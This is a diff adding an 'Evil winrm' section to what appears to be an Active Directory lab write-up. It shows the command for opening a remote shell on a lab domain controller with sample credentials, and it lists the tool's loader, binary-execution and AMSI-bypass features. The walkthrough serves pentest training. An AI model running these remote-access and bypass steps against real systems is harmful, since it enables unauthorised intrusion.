@@ -52,3 +52,35 @@ run # run exploit
 - now we get shell access 
 
 ![Desktop View](/assets/img/AD_Lab/1 (80).png){: }
+
+
+## Evil winrm
+- Download tool [evil-winrm](github.com/Hackplayers/evil-winrm) tool
+
+```bash
+
+#ruby evil-winrm.rb -i DC-IP -u Username -p Password
+
+ruby evil-winrm.rb -i 192.168.1.2 -u superman -p 'Password123!'
+
+```
+
+![Desktop View](/assets/img/AD_Lab/Pasted image 20220823014957.png){: }
+
+
+- See menu 
+
+```bash
+[+] Dll-Loader
+[+] Donut-Loader
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+
+```
+
+![Desktop View](/assets/img/AD_Lab/Pasted image 20220823015416.png){: }
